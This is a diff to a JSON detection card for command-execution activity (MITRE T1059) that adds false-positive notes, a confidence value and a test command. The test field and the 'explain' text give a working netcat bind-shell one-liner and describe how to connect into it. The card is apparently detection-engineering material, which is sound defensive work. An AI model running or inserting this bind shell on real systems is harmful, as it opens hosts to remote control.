@@ -101,7 +101,8 @@
           "T1059"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "IT admin tools, endpoint management agents, or security scanners performing similar actions"
       },
       {
         "platform": "splunk",
@@ -115,7 +116,8 @@
         "confidence": "medium",
         "log_ids": [
           "1"
-        ]
+        ],
+        "false_positives": "Admin scripts, management agents, or IT tools launching similar processes"
       },
       {
         "platform": "sigma",
@@ -126,7 +128,8 @@
           "T1059"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate system tools performing similar operations (e.g. admin scripts, management agents)"
       },
       {
         "platform": "elastic",
@@ -136,7 +139,9 @@
         "attack": [
           "T1059"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Legitimate admin tools or management agents performing similar endpoint operations",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -167,7 +172,8 @@
         "Review Microsoft Defender for Endpoint, Sysmon for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <port> >/tmp/f"
     }
   },
   "explain": "Bind-shell payload run on the target to open a listener you connect into:\n  mkfifo /tmp/f            named pipe for two-way I/O\n  cat /tmp/f|/bin/bash -i 2>&1   interactive bash fed by the pipe\n  |nc -lvp <port> >/tmp/f  netcat listens on the port and loops output back through the pipe\nYou then connect with 'nc <target> <port>'; needs an inbound-allowed port, and the card includes Python/other-language variants."
